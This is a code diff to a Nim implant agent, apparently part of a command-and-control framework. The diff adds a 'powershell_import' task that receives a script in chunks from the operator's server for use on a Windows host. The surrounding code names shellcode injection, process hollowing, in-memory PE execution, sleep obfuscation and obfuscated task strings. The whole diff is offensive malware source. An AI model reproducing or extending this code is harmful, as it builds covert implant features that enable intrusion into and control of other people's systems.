@@ -71,12 +71,13 @@ when defined(windows):
   import tasks/donut
   import tasks/inject_hollow
   import tasks/run_pe
+  import tasks/powershell_import
   when defined(sleepObfuscationEkko):
     import utils/ekko
 
 type
   BackgroundTaskType = enum
-    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE
+    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport
   
   BackgroundTaskState = object
     taskType: BackgroundTaskType
@@ -653,6 +654,20 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           # Screenshot doesn't use BackgroundTaskState, handled elsewhere
           discard
       
+      of obf("powershell_import"):
+        when defined(windows):
+          let fileName = params[obf("file_name")].getStr()
+          var state = BackgroundTaskState(
+            taskType: btPowershellImport,
+            path: fileName,
+            fileId: params[obf("file")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+      
       else:
         discard
       
@@ -1040,6 +1055,27 @@ proc postResponses*(agent: var Agent) =
                   if runpeResp.hasKey(obf("completed")) and runpeResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
                     debug "[DEBUG] RunPE complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
+            of btPowershellImport:
+              when defined(windows):
+                # Process incoming file chunks for powershell_import
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let importResp = processPowershellImportChunk(
+                    taskId, state.fileId, state.path,
+                    state.currentChunk, chunkData, totalChunks, state.fileData
+                  )
+                  agent.taskResponses.add(importResp)
+                  
+                  if importResp.hasKey(obf("completed")) and importResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] PowerShell import complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
